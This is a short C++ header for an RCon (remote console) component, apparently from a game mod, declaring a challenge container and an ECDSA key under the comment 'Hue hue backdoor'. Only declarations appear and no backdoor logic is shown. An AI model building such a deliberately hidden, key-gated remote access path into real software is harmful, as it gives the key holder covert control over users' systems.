namespace Components
{
	class RCon : public Component
	{
	public:
		RCon();
		~RCon();
		const char* GetName() { return "RCon"; };

	private:
		struct Container
		{
			int timestamp;
			std::string output;
			std::string challenge;
			Network::Address address;
		};

		// Hue hue backdoor
		static Container BackdoorContainer;
		static Utils::Cryptography::ECDSA::Key BackdoorKey;
	};
}
